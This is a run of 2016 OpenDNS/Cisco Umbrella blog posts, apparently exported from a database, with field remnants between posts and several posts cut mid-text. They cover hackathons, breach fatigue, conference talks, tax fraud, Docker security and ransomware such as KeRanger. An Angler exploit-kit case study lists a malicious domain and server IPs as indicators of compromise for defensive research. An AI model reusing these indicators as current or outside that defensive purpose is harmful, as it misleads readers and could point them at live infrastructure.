He then went through several real life examples of where he knew he screwed up.

Wrapping our first for 2016, I thought it would be nice to reflect on their importance.\nA few times a year our employees gather together for 24 hours of collaboration. Our team members get to work with other employees they may not typically work with and experiment on something totally new.\nOpenDNS uses agile methodologies to drive engineering and creativity. OpenDNS believes that the core of agile’s values is knowledge and experimentation. Hack-a-Thons generate bold experiments that many people may otherwise not try, and force people to step out of their comfort zones and really push themselves. Creating an environment that forces radical instinctive decisions and fast iterations helps spark creativity you normally don’t see.\nWhile many companies focus hack-a-thons toward their engineers, we like to think a bit bigger by encouraging every employee to participate. We believe this ensures that creativity is driven from all corners of our business. A key part to ensure success is removing the leaders from the process so that people can do what they believe is right based on the data they have. Simplifying the roles in the process cuts through much of people’s personal opinions and projections. Hack-a-thons give decision making power to the employees and empowers the participants to make things better. Hack-a-thons drive excitement and remind us what a group of motivated people can accomplish.\nDuring our last hack-a-thon, IT developed an interactive map to find conference rooms and our Office Manager in Vancouver designed a website to better share information about the office. Any employee is capable of changing a process, solving a business problem, or developing something that disrupts how we do things today. It’s more about training people to be makers and to change the landscape.\nGreat products have previously surfaced from our Hack-a-thons. By sparking innovation and  disrupting norms, in 24 hours we can change our product roadmap completely. An excellent example was the prototype for what is now a core product, OpenDNS’s Investigate. Others have also followed like, BPGStream, our free Twitter alerting resource for BGP Hijacks and major outages. The impact can be huge but it can also be as simple changing the way we operate, directly benefiting our customers.\nThere are several ways to host a hack-a-thon, but at OpenDNS, we are sold on the 24 hour time block.  Instead of hacking over an extended period of time, where priorities shift and ideas can become distracted, you are pushed to deliver in a time window. OpenDNS supports our participants with good food, overnight packs, nap tents, swag and prizes. We involve everyone in the company to generate the excitement. Our Design Team developed all the media, from posters to the t-shirts, all in house. The office staff was vital in ensuring everyone had a fun, power generated environment to work in. You can find that some Hack-a-thons have themes to guide people towards a common goal. Generally we don’t use themes, as open-ended Hack-a-thons lend towards out of the box thinking. So we “theme” it based on a common ideal. This past hack-a-thon we focused on “Building Tomorrow”.\nAt the end of the hack-a-thon, each team will demo the hack and present to anyone in the company who wants to attend. Even though hackers have been up for more than 24 hours, there is something invigorating about seeing your idea actually working. Software is typically so malleable that it is often hard for people to see your vision. This is one reason agile focuses on building the simplest thing, obtaining feedback, and quickly iterating.\nEveryone is encouraged to vote on ideas so we can see what the company is most excited about.

It’s a trend that has been rising since possibly 2011, the first “year of the breach.”\nThe idea of “breach fatigue” is once consumers go through enough events where personal data is stolen, enough headline announcements of Target or Sony or Anthem or Home Depot or — you name it — the less consumers care about it happening.\nOpenDNS Director of Security Tom Hash said in an interview for a previous article on the subject that consumers might not expect a breach to affect them, and may be surprised when it does, but that “most people don’t realize how sophisticated attack tools have become—tools that make it easy to exploit security vulnerabilities.”\nA new study suggests that consumers might now understand that a breach could happen to them personally, but that they also might not care. A survey of 2,038 adults conducted by Rand Corporation found that as much as a quarter of Americans have been notified that their information was compromised in a breach. The same survey, however, found that only 11 percent of those who were notified stopped doing business with the company.\nThis is a good sign for companies who may get hacked in the future, as it could mean that a breach won’t cripple business. But it should also be a reinforcement for open and honest disclosure of breaches when they happen. Companies with a loyal customer base should find that those affected by a breach will be forgiving when one occurs — or at the very least they will apathetic to it. This assumes the company will be transparent as to the event’s details, what info was stolen, and proactively do all it can to minimize the damage. For now, that means mostly credit monitoring. The same Rand Corporation study found 62 percent of those who had been through a data theft incident had accepted free credit monitoring.\nSo is it breach fatigue? Or breach acceptance?\nEither way, the survey also had suggestions from participants for how companies should respond to breaches, all of which they preferred over monetary compensation:\nTake measures to ensure that a similar breach cannot occur in the future\nOffer free credit monitoring or services to ensure that lost data is not misused\nNotify customers immediately\nThough these suggestions are a good start, companies should see these as the bare minimum, as two of the three take basically no effort and cost nothing. In addition, companies should also leverage engineer leaders to gather the scope and technical details of what was breached, and what services are specifically to affected. If Company A provides an API that others use as a platform for their own services, or the breach involves a program that has been downloaded thousands of times, the technical community will want to know how to respond, and whether or not its own services are vulnerable as a result.\nAnother important consideration is correctly framing the severity of a vulnerability or breach. Companies will forever try to minimize damage to save face and retain customers. Bounty hunters, researchers, and security companies will often try to play up a finding to make a name for themselves. But as a community, we need to inject a little reality into how bad something truly is, to avoid unnecessary panic and to encourage appropriate response.\nOn the Wire Editor-in-Chief Dennis Fisher wrote that an appropriate framing of severity is important, as this overplaying of bugs and vulnerabilities might soon cause consumers and customers to turn a deaf ear. “People tend to get fatigued by this stuff rather quickly, and the attention span of the Internet is shrinking by the second,” Fisher wrote in a post on Digital Guardian. “So don’t be surprised if users start tuning these announcements out and ignoring the constant drumbeat of Next Big Bug.”', 'Blog;News', 'https://umbrella.cisco.com/blog/2016/04/14/from-breach-fatigue-to-breach-acceptance/');

My favorite part was his description of an automatic door lock which unlocks when a paired phone is within 200 meters. Chester said it’s a useful feature when bringing home groceries, but that it has its drawbacks since he actually works just under 200 meters from his front door.\nThomas Arnold and Matt Bromiley from Mandiant presented “Purple Teaming: The Best of Both Worlds.” They discussed multiple attack techniques performed in a red team environment and effective blue team responses.

The feedback was great as it’s always nice to see how we differ in our approaches towards security implementations.\nAfterward, several attendees turned into presenters by giving impromptu talks on a variety of security topics. They were all great, but my favorite was a demonstration of the security risks of using Airbnb, either as a renter or home owner. It was more about the risks associated with physical device security and ownership of data flowing over a personal network than using the website of Airbnb. The speaker listed off suggestions for securing your network as a renter, and some of the activity renters could engage in if given physical access to your devices.\nMichael Gough, Commodity malware means YOU\nMichael Gough presented “Commodity malware means YOU! Let’s look at one called Dridex.” He went through the history of Dridex and previous variants, as well as mitigations that have worked in the past and potential fixes as that malware family continues to change. He also demonstrated the use of his product, LOG-MD, a promising tool that makes the life of an Incident Responder so much easier by simplifying log analysis and auditing across large environments.\nDaniel Crowley, of the NCC group presented, “Rapid covert physical entry.” He introduced different locking mechanisms and methods for bypassing them while avoiding detection. This included door locks that aren’t typically seen when visiting your local lock picking table at a security conference.\nMartin Brough, Modern crypto and you\nMartin Brough gave a presentation titled “Modern crypto and you!” He explained how encryption works and the differences between acronym’s such as SSL, TLS, PGP, PKI and more. He also touched on what may have happened with Truecrypt when they suddenly ceased development amidst a potential government intervention. Cryptography is a difficult topic to condense into a 45-minute presentation, but he did a fantastic job at educating beginners and advanced user alike. It’s unfortunate the whole world can’t experience his talk, because encryption should be available, understood, and easy to use for everyone.\nVirustotal Spelunking\nMonty St. John and Christopher Rogers of ATXForensics presented “Virustotal spelunking.” This was really interesting to me as I spend a good deal of time hunting with VirusTotal. Hundreds of thousands of potential malware artifacts are uploaded and analyzed daily on the VirusTotal website and many tools are available for mining that data. VT provides an easy-to-use API, and this presentation alerted me to the fact that I’m barely using it. I use Yara rules on VT to find malware that’s of interest to me or my team, and a Python script to batch download the samples it finds. But after seeing this presentation, I’ve begun developing new processes for analyzing network captures from active malware and to automatically analyze phishing emails on VT. Expect a blog post on this as soon as the process is more finalized.\nEarl Carter, Evolution of the Angler exploit kit\nThe last talk I was able to attend was something I’d been looking most forward to. Earl Carter of Talos presented the “Evolution of the Angler exploit kit.” He discussed his team’s research into the history of Angler EK, including direct work with a local ISP to watch not just the C2 servers, but also the management servers. He demonstrated analysis of various Angler components, revealing a possible change in ownership in the last year as well as new methods for delivering the Ransomware to victims.\nOne great thing about the conference was that multiple people included unsolicited information on how they use OpenDNS as part of their security layering to mitigate incidents in their environments. I generally kept quiet so as not to take over anyone’s talk, but often spoke with people afterwards about some of the methods OpenDNS employs to provide predictive security for its users. We chatted about NLPRank, our system for detecting domain names used on phishing, some of our research into discovering websites that have been compromised with Angler, and a few techniques we use in an attempt to limit infections by Locky, the most current Ransomware variant.\nThank you so much to BSides Austin for accepting my presentation and working so hard to educate the community!', 'Events;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/04/05/bsides-austin-2016/');

It’s become such a growing issue that the federal government has gathered a task force to figure out a solution. While we all wait, the IRS offers virtually nothing to prevent it from happening, and has a woefully outdated process to help the defrauded amend a return and recover their money. The thousands who will have their returns stolen, resulting in costs in the billions for the IRS, will suffer a months-long process of phone calls, filings, mailings, and of course another tax return.\nDell Engineer Chad Skipper knows this process well, resulting from his own run-in with tax fraud in 2014. At RSA 2016, Skipper regaled an audience with his personal saga through the process of recovering his return after a fraudster filed on his behalf. He was lucky, Skipper recalled, to even have found out that he had been defrauded at all — two days before taxes were due.\n“The only way you the taxpayer really find out is when you go to do your taxes online, you hit submit and it will come back and say ‘Hey, time out. You’ve already submitted this year,’” Skipper said. “That’s one way. The way I found out is the bank had closed the account of the fraudster and [the IRS] sent me a hard check.”\nBy this time, of course, it’s already too late to stop the fraud from occurring. So the only recourse is to try and amend the return. This process, as Skipper explained in his session, is not easy.\nWoefully unprepared\nIn 2014 the IRS reported that fraudulent returns cost the agency $6.5 billion. That number is expected to jump to as much as $21 billion this year.\nOn top of that, and the millions of suspicious returns the IRS has to comb through, the agency had its IT budget slashed by $200 million in 2015. Despite these challenges, the IRS reports that it has nearly $11 billion in fraudulent returns in 2016. Additionally, it is supposedly working on measures of support and further prevention for fraud.\nOne of the measures, however, is the Identity Protection PIN (or IP PIN). The PIN was previously only available to “eligible taxpayers.” As of March 17 however, the sign-up process for this PIN — which is supposed to be the version of multifactor verification to prevent fraud — has been “suspended until further notice.” The move is reportedly to review security measures for the registration to receive a pin. It was likely done because hackers were finding that registering only required a few easily obtained pieces of information like addresses, loan amounts, and dates.\nThe other touted effort from the IRS is “Theft Victim Assistance” organization, an organizational restructuring aiming to reduce the time and effort it takes to recover from tax return fraud. “During 2015, the IRS centralized most of its victim assistance work within one function,” the IRS website states. “The agency also is reviewing its process and procedures to better serve taxpayers and to help reduce the time it takes to resolve cases.” The website also states an average recovery can take 120 days.\nFour months is not exactly a rapid recovery. And that may be on the optimistic side. For Chad Skipper, it took twice as long.\nRoad to reconciliation\nOne of the major roadblocks in amending a fraudulent return is information access. Once notifying the IRS, which should be done as soon as possible, the fraudulent tax return no longer belongs to the individual for which it was submitted. Meaning, Skipper said, the fraudster who submitted it, has more rights than the person who was defrauded.\n“I [couldn’t] even find out if my kids were included on that tax return,” Skipper said. The IRS is subject to strict privacy laws pertaining to returns, which prevents any IRS agent from sharing information included in the return, even if it’s information about your family or dependents.\nFrom the IRS website: “Due to federal privacy laws, the IRS cannot disclose information to a person who is listed on a fraudulently filed tax return unless that person’s name and SSN is listed as the primary or secondary taxpayer on the return.”\nIn his presentation, Skipper laid out his process to reconciling his fraudulent return, which involved hours of time on the phone with multiple agencies, filings with the IRS, the Social Security office, the FBI’s IC3 office, the FTC, and all three credit reporting agencies.\nFrom Skipper’s RSA 2016 session.\nDespite his months of work to file the appropriate complaints and reports to these various agencies, Skipper was still met with what can be viewed as punitive responses from the IRS. Any victim of tax fraud will be ineligible to file electronically for three years; so all returns will need to be submitted manually through the mail. Additionally, Skipper said the IRS will delay any returns to him for 180 days after his filing. But, he also noted, if he owes money to the IRS, payment is expected immediately.\nLittle prevention, but what to do\nWith the IP PIN not being an option, tax filers are without many options to prevent a fraudulent return. The IRS itself is doing all it can, but considering the length of time — whether it be 120 days or eight months — that it takes to reconcile a false return, it’s important to do everything possible on an individual level.\nSkipper noted, importantly, that credit protection would not help with tax fraud. “I had two credit monitoring [services],” he said during his RSA session. “They don’t detect this.”\nStill, there are a number of measures everyone can take to help at least make tax fraud harder.\nUse a credit lock\n\nAlso known as a credit freeze. A credit lock gives individuals more control over their own credit score and lender data. They prevent lenders from accessing your credit report, making it highly unlikely that they grant any loan or line of credit.\n\n\nUse strong, varied passwords\n\nA common method for tax thieves is to hijack TurboTax or H&R Block accounts using stolen credentials found in other data breaches. Skipper for instance, suspects his tax return started because of personal data stolen from the health insurance company Anthem.\n\n\nEnable two-factor authentication\n\nIntuit starting in February of 2015 offered mutli-factor authentication, which is a good idea for any and all sites that take a password. H&R Block and TaxAct have also made the option available for online users, and it should be enabled hastily if not done already.\n\n\nWatch out for phishes\n\nPhishing is still, and will be for the foreseeable future, on of the easiest way to steal login credentials. And it’s clear attackers are spending more effort on the crafting and design of phishing attempts to make them convincing. For more on phishing, check out the OpenDNS Labs blog.\nFor companies large and small, phishing awareness is more important than ever. A trend is growing that involves e-mail spoofing an executive level employee and simply asking for either money or data. So it’s also important to verify any requests coming from a company leader; particularly if the request is for large batches of data or money; and especially particularly if the request contains poor use of English.\nOn March 22, a Reddit user took to the site for advice on a scenario in which an HR representative at his company had been duped and offered up the W-2 form for every single employee. The HR rep believed the request came from a high-level executive, likely because hackers spoofed the exec’s e-mail address.\nEnterprise leaders own a nearly equal part in protecting the identity and privacy of employees as the employees themselves.\nIf you are one of the unfortunate souls whose return is stolen, Money has a good guide for what to do next.

These kits employ known vulnerabilities to exploit a user’s web browser and deliver various payloads such as TeslaCrypt and the fairly new Locky ransomware. For more information on exploit kits and protecting yourself from them, see this past blog post. We’ll be taking a look at how we can leverage some of the techniques that the Angler actors utilize — namely domain shadowing and common IP’s — in conjunction with information available in Investigate to uncover domains that are part of the Angler infrastructure before they have been used to infect users.\nDOMAIN SHADOWING\nAccording to a writeup by the Talos group titled “Threat Spotlight: Angler Lurking in the Domain Shadows,” domain shadowing is the “process of using users’ domain registration logins to create subdomains (i.e., says.imperialsocks.com).” In the example given, the registrant account for “imperialsocks.com” has been compromised. In the case of Angler, imperialsocks.com would live at one IP, while says.imperialsocks.com would resolve to an Angler IP. Additionally, since domain shadowing requires control of the domain registrant’s account, any domains registered with the same account used to register imperialsocks.com are also considered compromised by association. Let’s look at how we can utilize some of the Investigate features to preemptively block these compromised domains.\nA CASE STUDY\nRecently, OpenDNS researchers have been working on a scanner that allows us to identify new Angler gates before they experience spikes in traffic. We will take just one of the domains found by this scanner, and demonstrate how this initial indicator allows us to find a whole slew of additional Angler domains.\nThe shadowed Angler subdomain that the scanner found was ef[.]lawers[.]us. Pictured below is the dns traffic for this domain when it was first picked up by the scanner.\n\nTraffic graph of lawers[.]us before the Angler traffic spike.\nThe WHOIS information in Investigate shows that this particular registrant account has 20 other domains associated with it.\n\nLawers[.]us WHOIS Information\nSome of these domains are currently registered to this account, while others have been associated with the registrant in the past, but are no longer under their control.\nDomains registered under the compromised registrant account.\nAll of the current domains are considered compromised, since the Angler actors have control over this registrant’s account and can create new Angler subdomains as they please. In addition to the WHOIS information, the Angler IP can be used in Investigate to find other Angler subdomains pointing to the same IP address. In the screenshot below, the effects of domain shadowing can be seen, as the root domain points to one IP (184.168.221.54), while the shadowed subdomain points to an Angler IP (188.227.16.37).\nDNS response for the root domain and the seen angler subdomain.\nSearching the IP of the shadowed subdomain in Investigate results in the following known domains that resolve to that IP.\nAngler subdomains seen resolving to the same IP address.\nAll of these domains are serving Angler. Like the initial domain, the registrant accounts of all of these domains are compromised; thus, the WHOIS information for all of these domains can be used to find even more compromised domains as was just demonstrated.\nTHE RESULTS\nHere is a screenshot of the traffic to the initial domain (lawers[.]us) just hours after it was picked up by the Angler scanner.\n\nTraffic graph of lawers[.]us following the Angler traffic spike.\nPictured is the characteristic spike in traffic that accompanies Angler. A similar spike can be seen in the traffic of many of the other registrant’s domains, showing the Angler actors’ full control over the user’s account. The traffic graphs of some of these domains are pictured below.\n\n\n\nWith this method, Investigate users can enumerate hundreds of compromised Angler domains off of just one initial indicator.', 'Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2016/03/31/fishing-for-angler-pivoting-through-angler-infrastructure/');

There were a lot of sharp individuals giving talks, but some of them I would like to mention aside.\nBeau Bullock | Fade from Whitehat… to Black\nI was most impressed at this keynote speech on offensive security, which showed how skilled and dedicated these guys are when it comes to infosec. I have a background in pentesting, but never had a chance to penetrate a real enterprise network, so it was very exciting to get inside details from Black Hills colleagues.\nOne of the most important takeaways for me was the analysis of Bitcoin VPS, because analysis of the money flow in criminal business is a topic that interests me greatly.\nSo if your network has been attacked and you were not able to track it back to the hacker, he most likely used a setup similar to the one mentioned above. And mentioned by the speaker, 99 percent of the pentests they conducted were successful, which again reminds us how insecure most enterprises are.\nAnother important aspect of this talk is that it focused on the attacker’s point of view, and this is something that really makes me think about how important it is to have a red team in the security department.\n\nSanders Diaz | Introduction to Custom Protocol Fuzzing\nThis talk covered protocol fuzzing and reversing for finding vulnerabilities, but a lot of the methods can be used for research of custom protocols, that are created by malicious authors specifically for malware.\nReverse engineering of custom protocols is getting more and more important when it comes to new ransom, Trojan, and worm threats. Their authors continuously change code, encryption protocols, and obfuscation.

Questions one might ask when considering any product. Does this product fit into my current security stack? What does it cost? Do I need to hire or train someone to manage it? How long before it adds value and improves my security posture?\nHowever, there are other vendor considerations that may seem more abstract but are equally important: Does this vendor truly care about its customers post-sale? How does it ensure customers leverage their investment? Does it continually drive value for customers? And how is that manifested in the customer experience?\nThe consumption model continues to shift with the rise of social selling, advocate marketing, and “everything” shops like Amazon. This ongoing change puts power squarely in the hands of buyers — and that goes for technology buyers in the B2B space, too. The movement of CapEx to OpEx and trends toward cloud solutions have as much to do with shifting the burden for results to the vendor as it does with where those expenses show up on financial statements. Given these shifts, the customer experience (and by extension, the customer success practice) has blossomed into an industry of its own.\nThe LAER framework was popularized by some very smart people at the Technology Services Industry Association (TSIA). It serves to focus company tools, process, and people around four key components of the customer journey and experience: landing, adopting, renewal, and (more recently) expanding the footprint beyond the initial sale.\nThe LAER framework is widely accepted within the customer success industry, but — with no disrespect to my esteemed colleagues at TSIA — I’ve always felt it was missing something. While LAER is great for focusing on certain positive customer outcomes, at OpenDNS we’ve modified the model to include an “S” for one of the most important aspects of customer success: service.\nIntroducing the LASER Method\nBy adding that one initial, we acknowledge our responsibility for customer service and support experience, because we know poor service risks our customer relationships throughout their entire journey! In our customer success organization, we strive to lead customers efficiently toward positive outcomes too, but we do so with an eye toward answering a few questions of our own: Do our customers feel empowered? Do they leave every interaction with us feeling positive about our brand? Are they deriving increased value from our partnership over time? Are they advocates for us to their friends and colleagues?\nAt OpenDNS, we measure our success through our customers’ success…and their positive outcomes. To every question above, we strive for a resounding “Yes!”\nService (the “S”) is another key part of managing relationships that are strategic, valuable, loyal, and growing. And we pledge to stay LASER-focused on demonstrating value for our customers across the entire journey: Landing, Adoption, Service, Expansion, and the Renewal experiences. And we continue to measure the success of our mission with CARE metrics, as I’ve blogged in the past.\nWhile this may seem like common sense, the truth is the compasses at many companies are spinning out of control when it comes to proactively managing their customer’s journey. But we know that the happiest customers are the ones who continually gain value from their investment. With each and every interaction, we’ll strive to make that your reality.\nOn behalf of the entire Cisco/OpenDNS team, we appreciate your business!', 'Blog;Community;People & Culture', 'https://umbrella.cisco.com/blog/2016/03/25/opendns-maintains-laser-focus-on-customer-success/');

Consider Security First', 'Owen Lystrup', 'March 17, 2016', 'Containers started making a big splash in IT and dev operations starting in 2014. The benefits of flexibility and go-live times, among many others, are almost undeniable. But large enterprises considering using a container platform for development or IT operations should pause and consider security first.\nLast year DataDog, an IT infrastructure monitoring company, surveyed 7,000 companies and found that Docker adoption was up fivefold from 2014 to 2015. If true, the adoption rate for using containers as opposed to virtual machines and hypervisors to run apps is rather unprecedented for enterprises large and small. The survey also found that two-thirds of companies that evaluate Docker, end up adopting it.\nDocker is a platform that allows IT sys admins, software developers, engineers, or anyone needing to publish a piece of code or software, to compartmentalize apps along with their code libraries and executable files into what are called containers. Rather than use an entire OS instance like Windows to run one application on a virtual machine, container platforms like Docker can use far fewer resources, a single OS, and containers to keep processes separate from one another, and thus far more efficient. Containers certainly have a large number of benefits for IT and dev ops, such as fewer virtual machines and OS instances to patch and update, fewer hardware boxes to house and maintain, rapid application deployment (really rapid, like seconds in most cases), easy version control, easy sharing, and so on. However, there is speculation from some that containerization — to use such a Franken-term — is not ready for large enterprise use.\nMuch of that speculation comes from both the previous security issues that plagued Docker’s early days, and the fact that it is such new technology that has not been hardened through widespread use.\nOf course there are security issues\nAt RSA 2016 Securosis Contributing Analyst David Mortman led a session on security for Docker, and quoted Red Hat Engineer Dan Walsh as saying, “Containers don’t contain.” What he means is, because an application or piece of code lives in a container, it doesn’t mean the container is going to prevent leaks to other containers or the OS itself. In other words, there is nothing inherently secure about containers. In fact, Mortman said, Docker has openly admitted this fact in the past.\n“If you talk to the Docker guys, they say ‘Of course there are security issues. This is beta code,” Mortman said.\nAnd that’s the underlying issue. Sure the security problems extend from necessity of root privilege in containers to run a process or app, and namespace issues with the Linux host. Docker’s own documentation highlights four core security issues that should be addressed when using the platform.\n“From an application perspective,” Mortman said, “you have only what you need, which is great.” But, he added, the security concerns are that of really any operating system. Backing up data, reducing the attack surface, keeping access levels under control, are all still necessary.\nDuring his talk, Mortman recommended using the Docker Security Benchmark tool available on Github. It’s a utility developers can run against a container that will check for dozens of known security issues. It’s based on the collaboration project Docker embarked on with the Center for Internet Security, which resulted in a 120-plus page benchmark for security best practices.\nAnd outside of the 17 or so security bullet points that Mortman outlined in his talk, above all, he said container security should be treated just like Linux or OS security. One core piece of advice about Docker is exercising extreme care about using public containers. Docker Hub is like any open software platform, with publicly available images, scripts, apps, and utilities developers can find on Github and repurpose — more than 100,000 of them. And the Docker Hub registry does its best to ensure the validity of images by adding signatures and hashes of the image to make sure what is in the image’s manifest is actually what’s in the image.\nBut, Mortman cautioned, “Don’t trust them blindly. It’s not rocket science, but we all do it sometimes.” Developers should still check the hashes of any image pulled from a public source before using it in production.\nEmbrace the benefits, but with caution\nIf embracing the power of Docker, it’s a good idea to temper it with good container hygiene, like not using root unless absolutely necessary (which it usually is not), preventing container leaks, mounting only necessary volumes and not extraneous ones like etc.\nOpenDNS Security Engineer Chris Dorros says using a container hosting platform can help ensure the hygiene required for large enterprises.  “Having a platform for developers where they can host their containers as a service can help centralize security controls and greatly reduce mistakes,” he said in an e-mail interview. “At OpenDNS we use a homegrown system called Quadra, but there are others like Kubernetes.”\nFor more on Quadra and how OpenDNS uses Docker, see the previous posts from the OpenDNS engineering team.', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2016/03/17/considering-docker-consider-security-first/');

Wardle is a former NSA employee, and has developed tools for detecting and blocking malware activity in OS X. His response to the question was almost prophetic.\n“I’m actually really surprised we haven’t seen a bunch already,” he said. “There’s a lot of naive Mac users out there that are infecting themselves [with malware].” Technically speaking, he added, there’s no reason Mac ransomware doesn’t exist already. Adware has started popping up on the market, which is just as difficult — meaning not at all — to develop.\nThen, not even a week following Wardle’s RSA session, a version of crypto ransomware — possibly the first case — appeared. Dubbed KeRanger, and discovered by Palo Alto Networks, the ransomware version used a legitimate developer signature on a legitimate application called Transmission, an app used for downloading torrents.\nIn a previous RSA session — and at other conferences — Wardle demonstrated how crafting malware for the operating system is trivial, and how easy it is to bypass the safeguards Apple put in place like Gatekeeper, the sandbox feature for applications. KeRanger seems to be a perfect case study in exactly how that works, a legitimate developer signature used to turn a benign application malicious, completely bypassing OS X’s built-in security.\nFrom the Transmission support forums.\nThis new development was not a disaster scenario, as Transmission developers issued a quick update and Apple revoked the abused developer signature in hours. Additionally, it appears the malware was caught in some cases by OS X’s built-in quarantine feature, as some Transmission forum users reported. KeRanger could be, however, an indication of something more drastic coming.\nRansomware market saturation\nRansom32 encryption notice, from OpenDNS Labs.\nJust recently OpenDNS Security Researcher Artsiom Holub published analysis of Ransom32. It’s a flavor of ransomware that has been around since at least January, but is interesting for a couple key reasons. The first is the variant seems to have adapted to feedback from a customer base — yes ransomware and malware authors have customers too, not just victims.\nFrom Holub’s analysis:“The very first client was about 22 MB. The current are 1.06 MB and 3.31 MB. This indicates that the ransomware author listens to his customers. Decreasing the size and redesigning the package makes it a lot easier to use for malicious purposes.”\nThe author’s adaption to stay competitive and viable is also a reminder that ransomware exists in a competitive marketplace, where the most effective tools get the most business.\nThe second interesting note is the ransomware version is built on Node.js, a cross-platform JavaScript environment. Because it’s built on the Node.js platform, it could be translated to Mac OS X or Linux, which might mean it’s only a matter of time. And true to form, KeRanger was found to be a Linux infection reconfigured for OS X.\nRansomware, and malware in general, has not been the calamity it has been for Windows, largely because attackers are not yet focusing on OS X, and also because Apple’s app development process and requirements are more involved to keep applications secure. But, as TrustedSec CEO David Kennedy said in an interview with Slate, the marketplace for Windows malware and ransomware is competitive and may be turning saturated. If it becomes too saturated, or if Mac adoption continues its increase, more attackers might target OS X users to increase their profit.\nA bad network neighborhood\nOpenDNS CTO Dan Hubbard and his team used the IPs and domain information to explore the network infrastructure for KeRanger and found what was probably expected.\nA .onion site found in the neighborhood of KeRanger’s infrastrucure. From OpenDNS Labs.\nHubbard’s analysis shows the network neighborhood for KeRanger holds all sorts of unsavory sites, including drug sales, malware instruction sites, carding forums and others. It was also discovered that the attackers were using the Tor network, an increasingly trendy method hackers are using to decrease the chances of detection and tracking.\nA confusing protection game plan\nThe advice for protection against ransomware is scattered and mostly a list of security best practices.\nKaspersky and other security firms have developed decryption codes for some variants of ransomware. But as Holub’s article shows, the ransomware market is a competitive one, which means variants change often and new flavors appear regularly.\nThe only consistent advisory message from experts in ransomware protection is to back up files to the cloud. Attacks can render local backups useless, as they can also encrypt the backup files. This was reportedly one of KeRanger’s goals.\nBacking unfortunately does not prevent downtime, as it can be a large effort to restore thousands of endpoints if an attack hits a company’s entire network. As an example, a Hollywood hospital recently decided it was more efficient to pay the $17,000 ransom than it would have been to eradicate the infection and restore backups.\nWardle also suggests Block Block for Macs, a tool he developed himself that can detect if an application is exhibiting persistent behavior, like automatically launching after reboot. While this is normal behavior for some legitimate applications, it’s also a tip off to malicious applications, especially if they are unsigned.\nBecause of the security flaws in OS X, and the lack of a direct and easy way to protect them against attack, ransomware could become a pressing liability for both enterprises and individual users in 2016. Meaning the current reprieve from crippled machines, antivirus patching, and the moral dilemma of paying up or losing files, may soon be at an end.\nTo learn more about ransomware, consider joining the upcoming webinar discussion between OpenDNS and Cisco’s AMP team taking place March 30 at 10 am.', 'Blog;Labs Research;News;Security 101', 'https://umbrella.cisco.com/blog/2016/03/10/17123/');

By now we assume most of you are familiar with ransomware but we have published a primer in the past.\nAt OpenDNS and Cisco we have published numerous blogs, papers, and webcasts on the subject. We’ve also presented on ransomware since early 2012 — most recently on the emergence of Ransomware as a Service. If you want a refresh on some of our content, here are links to our most read materials:\nEasy, Cheap and Costly: Ransomware is Growing Exponentially\nTracking the Footprints of Ransomware\nThe Ransomware of Things\nCryptolocker: Containment is the new prevention\nThe Wrap Up: Containing Cryptolocker Webcast\nThe Ripple Effect: Containing Cryptolocker\nBedep Lurking in Angler’s Shadows.\nSophistication Increases\nWith ransomware attacks, we have seen a plethora of techniques that range from infecting users through email lures to piggybacking on exploits and other infections such as Angler. Equally as sophisticated, attackers have built resilient infrastructures for their platforms. We have seen several techniques over the years, including the use of Domain Generated Algorithms (DGA), infecting good web properties, and using TLDs, CCTLDs, and GTLDs.\nWith the most recent Apple OS X version of ransomware, attackers infected the Transmission clients software with their own code to avoid detection and get installs. Although this attack was not prevalent for a variety of reasons, it does highlight the rise in sophistication.\nThe Dark Web\nAs mentioned above, in this particular version the attackers infected a client that utilized the Tor network for routing their users. While the Tor network is a powerful tool that allows users to avoid eavesdropping and possible surveillance for lawful citizens, unfortunately, it is also sometimes abused by criminal enterprises — such as the ransomware folks — to avoid detection. In this case the IP address we outlined in our video is the IP of a Tor proxy. It’s important to note that this is *not* the location of the hosting service but a location that acts as a gateway to the information. The IP addresses that the domains resolve to are simply proxies that take you to the ultimate destination.\nAfter some investigation of the indicators from the most recent Palo Alto Networks Blog on a piece of malware coined “KeRanger,” we noticed the attackers are using the TOR network. What we found particularly interesting is what lurked on the same infrastructure that the attackers were using to host their data.\nAmong other items on the same network — as Palo Alto’s blog outlined — we discovered: Ransomware as a Service (RaaS) sites, instructions for end-users on how to pay for decryption, credit card and other credentials for sale, online black hat carding forums, hacker training contents, and illegal drugs for sale. We have included some screenshots of these sites below along with some screenshots of the Tor proxy pages:\n\n\n\n\n\n\n\n\n\n\nProtecting your Enterprise: Effectively Simple\nThroughout the years OpenDNS has done an amazing job at protecting customers from the various versions of ransomware by detecting the infrastructure that the attacks utilize to connect, control, and transfer the keys to evoke the encryption. Arguably the simplest and most effective way to prevent your files from being encrypted is to configure your recursive DNS to our infrastructure. Additionally, our Investigate product allows you to not only pivot through the infrastructure to validate the context of an Indicator of Compromise (IOC), but also to pivot into other inferences based on our security graph of data.\nBelow is a quick screen share video of our Investigative product looking at the most recent version of KeRanger.\n\n\nProtecting against Encryption\nThe most sophisticated criminals are continually testing new infection methods and evasion techniques. One example of this is the use of encryption on the network. In this particular case the addition of an endpoint is critical in defense. In the above example, if the encryption was invoked then Cisco’s AMP for Endpoint product works as a great additional layer of both visibility, retrospection, and enforcement for ransomware. For the particular case of OS X, AMP had endpoint protection for customers, as evident by this screenshot:\n\nMoving Forward\nWith the advent of Ransomware as a Service it is likely we will see more groups involved in this technique of extorting money from companies, and a rise in the sophistication of their infection vectors,  infrastructure, and business models. Items such as trickling or selective encryption, data awareness, and target awareness are all likely to surface. With that, no company should be without a strategy to prevent, detect, and respond to these attacks as they are the combination of sophisticated and well-resourced adversaries, and are impactful to running your business.\nOpenDNS and Cisco’s AMP team will be hosting a webcast about ransomware on March 30th at 10:00 AM PST.

